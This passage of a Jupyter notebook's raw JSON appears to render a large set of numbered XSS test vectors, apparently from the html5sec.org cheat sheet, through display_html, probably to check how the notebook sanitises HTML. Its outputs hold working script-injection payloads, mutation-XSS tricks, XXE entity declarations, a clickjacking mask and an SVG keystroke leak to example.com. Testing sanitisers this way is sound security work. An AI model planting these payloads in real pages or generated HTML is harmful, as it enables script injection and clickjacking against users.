                   "<div id=\"62\"><!-- IE 6-8 -->\n<x '=\"foo\"><x foo='><img src=x onerror=alert(62)//'>\n<!-- IE 6-9 -->\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"63\"><embed src=\"javascript:alert(63)\"></embed> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img src=\"javascript:alert(2)\">\n<image src=\"javascript:alert(2)\"> // IE6, O10.10\u2193, OM10.0\u2193\n<script src=\"javascript:alert(3)\"></script> // IE6, O11.01\u2193, OM10.1\u2193//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"64\"><!DOCTYPE x[<!ENTITY x SYSTEM \"http://html5sec.org/test.xxe\">]><y>&x;</y>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"65\"><svg onload=\"javascript:alert(65)\" xmlns=\"http://www.w3.org/2000/svg\"></svg>//[\"'`-->]]>]</div><div id=\"66\"><?xml version=\"1.0\"?>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<?xml-stylesheet type=\"text/xsl\" href=\"data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E\"?>\n<root/>//[\"'`-->]]>]</div>\n<div id=\"67\"><!DOCTYPE x [\n    <!ATTLIST img xmlns CDATA \"http://www.w3.org/1999/xhtml\" src CDATA \"xx\"\n onerror CDATA \"alert(67)\"\n onload CDATA \"alert(2)\">\n]><img />//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"68\"><doc xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns:html=\"http://www.w3.org/1999/xhtml\">\n    <html:style /><x xlink:href=\"javascript:alert(68)\" xlink:type=\"simple\">XXX</x>\n</doc>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"69\"><card xmlns=\"http://www.wapforum.org/2001/wml\"><onevent type=\"ontimer\"><go href=\"javascript:alert(69)\"/></onevent><timer value=\"1\"/></card>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"70\"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"71\"><// style=x:expression\u00028alert(71)\u00029>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"72\"><form><button formaction=\"javascript:alert(72)\">X</button>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"73\"><event-source src=\"event.php\" onload=\"alert(73)\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"74\"><a href=\"javascript:alert(74)\"><event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\" /></a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"75\"><script<{alert(75)}/></script </>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"76\"><?xml-stylesheet type=\"text/css\"?><!DOCTYPE x SYSTEM \"test.dtd\"><x>&x;</x>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"77\"><?xml-stylesheet type=\"text/css\"?><root style=\"x:expression(alert(77))\"/>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"78\"><?xml-stylesheet type=\"text/xsl\" href=\"#\"?><img xmlns=\"x-schema:test.xdr\"/>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"79\"><object allowscriptaccess=\"always\" data=\"x\"></object>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"80\"><style>*{x:\uff45\uff58\uff50\uff52\uff45\uff53\uff53\uff49\uff4f\uff4e(alert(80))}</style>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"81\"><x xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:actuate=\"onLoad\" xlink:href=\"javascript:alert(81)\" xlink:type=\"simple\"/>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"82\"><?xml-stylesheet type=\"text/css\" href=\"data:,*%7bx:expression(write(2));%7d\"?>//[\"'`-->]]>]</div><div id=\"83\"><x:template xmlns:x=\"http://www.wapforum.org/2001/wml\"  x:ontimer=\"$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)\"><x:timer value=\"1\"/></x:template>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"84\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"javascript:alert(84)//#x\"/>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"85\"><x xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\" ev:handler=\"test.evt#x\"/>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"86\"><body oninput=alert(86)><input autofocus>//[\"'`-->]]>]</div><div id=\"87\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(87)\"><rect width=\"1000\" height=\"1000\" fill=\"white\"/></a>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"89\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<set attributeName=\"onmouseover\" to=\"alert(89)\"/>\n<animate attributeName=\"onunload\" to=\"alert(89)\"/>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"90\"><!-- Up to Opera 10.63 -->\n<div style=content:url(test2.svg)></div>\n\n<!-- Up to Opera 11.64 - see link below -->\n\n<!-- Up to Opera 12.x -->\n<div style=\"background:url(test5.svg)\">PRESS ENTER</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"91\">[A]\n<? foo=\"><script>alert(91)</script>\">\n<! foo=\"><script>alert(91)</script>\">\n</ foo=\"><script>alert(91)</script>\">\n[B]\n<? foo=\"><x foo='?><script>alert(91)</script>'>\">\n[C]\n<! foo=\"[[[x]]\"><x foo=\"]foo><script>alert(91)</script>\">\n[D]\n<% foo><x foo=\"%><script>alert(91)</script>\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"92\"><div style=\"background:url(http://foo.f/f oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"93\"><div style=\"list-style:url(http://foo.f)\u0010url(javascript:alert(93));\">X</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"94\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<handler xmlns:ev=\"http://www.w3.org/2001/xml-events\" ev:event=\"load\">alert(94)</handler>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<feImage>\n<set attributeName=\"xlink:href\" to=\"data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D\"/>\n</feImage>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"96\"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>\n<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"97\"><!-- IE 5-9 -->\n<div id=d><x xmlns=\"><iframe onload=alert(97)\"></div>\n<script>d.innerHTML+='';</script>\n<!-- IE 10 in IE5-9 Standards mode -->\n<div id=d><x xmlns='\"><iframe onload=alert(2)//'></div>\n<script>d.innerHTML+='';</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"98\"><div id=d><div style=\"font-family:'sans\u0017\u0002F\u0002A\u0012\u0002A\u0002F\u0003B color\u0003Ared\u0003B'\">X</div></div>\n<script>with(document.getElementById(\"d\"))innerHTML=innerHTML</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"99\">XXX<style>\n\n*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */\n\n<!--\n--><!--*{color:red}   /* all UA */\n\n*{background:url(xx //**/\red/*)} /* IE 6-7 Standards mode */\n\n</style>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"100\"><img[a][b]src=x[d]onerror[c]=[e]\"alert(100)\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"101\"><a href=\"[a]java[b]script[c]:alert(101)\">XXX</a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"102\"><img src=\"x` `<script>alert(102)</script>\"` `>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"103\"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[\"'`-->]]>]</div><div id=\"104\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"foo\">\n<x xmlns=\"http://www.w3.org/2001/xml-events\" event=\"load\" observer=\"foo\" handler=\"data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar\"/>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"105\"><iframe src=\"data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03\"></iframe>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"106\"><img src onerror /\" '\"= alt=alert(106)//\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"107\"><title onpropertychange=alert(107)></title><title title=></title>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"108\"><!-- IE 5-8 standards mode -->\n<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=xx onerror=alert(108)></a>\">\n<!-- IE 5-9 standards mode -->\n<!a foo=x=`y><img alt=\"`><img src=xx onerror=alert(2)//\">\n<?a foo=x=`y><img alt=\"`><img src=xx onerror=alert(3)//\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"109\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"/></a>\n<rect  fill=\"white\" style=\"clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);\"/>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"110\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M0,0\" style=\"marker-start:url(test4.svg#a)\"/>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"111\"><div style=\"background:url(/f#[a]oo/;color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"112\"><div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\">X</div>//[\"'`-->]]>]</div><div id=\"113\"><div id=\"x\">XXX</div>\n<style>\n\n#x{font-family:foo[bar;color:green;}\n\n#y];color:red;{}\n\n</style>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"114\"><x style=\"background:url('x[a];color:red;/*')\">XXX</x>//[\"'`-->]]>]</div><div id=\"115\"><!--[if]><script>alert(115)</script -->\n<!--[if<img src=x onerror=alert(2)//]> -->//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"116\"><div id=\"x\">x</div>\n<xml:namespace prefix=\"t\">\n<import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"<img\u000bsrc=x\u000bonerror\u000b=alert(116)>\">//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"117\"><a href=\"http://attacker.org\">\n    <iframe src=\"http://example.org/\"></iframe>\n</a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"118\"><div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/plain','malicious code');\">\n    <h1>Drop me</h1>\n</div>\n<iframe src=\"http://www.example.org/dropHere.html\"></iframe>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"119\"><iframe src=\"view-source:http://www.example.org/\" frameborder=\"0\" style=\"width:400px;height:180px\"></iframe>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<textarea type=\"text\" cols=\"50\" rows=\"10\"></textarea>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"120\"><script>\nfunction makePopups(){\n    for (i=1;i<6;i++) {\n        window.open('popup.html','spam'+i,'width=50,height=50');\n    }\n}\n</script>\n<body>\n<a href=\"#\" onclick=\"makePopups()\">Spam</a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"121\"><html xmlns=\"http://www.w3.org/1999/xhtml\"\nxmlns:svg=\"http://www.w3.org/2000/svg\">\n<body style=\"background:gray\">\n<iframe src=\"http://example.com/\" style=\"width:800px; height:350px; border:none; mask: url(#maskForClickjacking);\"/>\n<svg:svg>\n<svg:mask id=\"maskForClickjacking\" maskUnits=\"objectBoundingBox\" maskContentUnits=\"objectBoundingBox\">\n    <svg:rect x=\"0.0\" y=\"0.0\" width=\"0.373\" height=\"0.3\" fill=\"white\"/>\n    <svg:circle cx=\"0.45\" cy=\"0.7\" r=\"0.075\" fill=\"white\"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"122\"><iframe sandbox=\"allow-same-origin allow-forms allow-scripts\" src=\"http://example.org/\"></iframe>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"123\"><span class=foo>Some text</span>\n<a class=bar href=\"http://www.example.org\">www.example.org</a>\n<script src=\"http://code.jquery.com/jquery-1.4.4.js\"></script>\n<script>\n$(\"span.foo\").click(function() {\nalert('foo');\n$(\"a.bar\").click();\n});\n$(\"a.bar\").click(function() {\nalert('bar');\nlocation=\"http://html5sec.org\";\n});\n</script>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"124\"><script src=\"/example.com\foo.js\"></script> // Safari 5.0, Chrome 9, 10\n<script src=\"\\example.com\foo.js\"></script> // Safari 5.0//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"125\"><?xml version=\"1.0\"?><?xml-stylesheet type=\"text/xml\" href=\"#stylesheet\"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns=\"http://www.w3.org/2000/svg\">    <xsl:stylesheet id=\"stylesheet\" version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">        <xsl:template match=\"/\">            <iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(125)\"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill=\"red\" r=\"40\"></circle></svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"126\"><object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"></object>\n<object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"alert(126)\" style=\"behavior:url(#x);\"><param name=postdomevents /></object>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"127\"><svg xmlns=\"http://www.w3.org/2000/svg\" id=\"x\">\n<listener event=\"load\" handler=\"#y\" xmlns=\"http://www.w3.org/2001/xml-events\" observer=\"x\"/>\n<handler id=\"y\">alert(127)</handler>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"128\"><svg><style><img/src=x onerror=alert(128)// </b>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"129\"><svg><image style='filter:url(\"data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>\")'>\n<!--\nSame effect with\n<image filter='...'>\n-->\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"130\"><math href=\"javascript:alert(130)\">CLICKME</math>\n<math>\n<!-- up to FF 13 -->\n<maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(2)\">CLICKME</maction>\n\n<!-- FF 14+ -->\n<maction actiontype=\"statusline\" xlink:href=\"javascript:alert(3)\">CLICKME<mtext>http://http://google.com</mtext></maction>\n</math>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"133\"><!-- `<img/src=xxx onerror=alert(133)//--!>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"134\"><xmp>\n<%\n</xmp>\n<img alt='%></xmp><img src=xx onerror=alert(134)//'>\n\n<script>\nx='<%'\n</script> %>/\nalert(2)\n</script>\n\nXXX\n<style>\n*['<!--']{}\n</style>\n-->{}\n*{color:red}</style>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"135\"><?xml-stylesheet type=\"text/xsl\" href=\"#\" ?>\n<stylesheet xmlns=\"http://www.w3.org/TR/WD-xsl\">\n<template match=\"/\">\n<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>\n<if expr=\"new ActiveXObject('htmlfile').parentWindow.alert(2)\"></if>\n</template>\n</stylesheet>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"136\"><form action=\"x\" method=\"post\">\n<input name=\"username\" value=\"admin\" />\n<input name=\"password\" type=\"password\" value=\"secret\" />\n<input name=\"injected\" value=\"injected\" dirname=\"password\" />\n<input type=\"submit\">\n</form>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div id=\"137\"><svg>\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"?\">\n<circle r=\"400\"></circle>\n<animate attributeName=\"xlink:href\" begin=\"0\" from=\"javascript:alert(137)\" to=\"&\" />\n</a>//[\"'`-->]]>]</div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img name=\"bar\" id=\"foo\">"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<input name=submit>123"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<input name=acceptCharset>123"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<img src=\"small.jpg\" srcset=\"medium.jpg 1000w, large.jpg 2000w\">"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<div &nbsp;=\"\"></div>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<x/><title>&amp;lt;/title&amp;gt;&amp;lt;img src=1 onerror=alert(1)&gt;"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<svg></p><title><template><style></title><img src=x onerror=alert(1)>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<form><input name=namespaceURI>"
               ]
           },
           "metadata": {}
       },
       {
           "output_type": "display_data",
           "data": {
               "text/html": [
                   "<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>"
               ]
           },
           "metadata": {}
       }
   ],
   "source": [
    "from IPython.display import display_html\n",
    "display_html(\"<script>alert(1)</script>\", raw=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
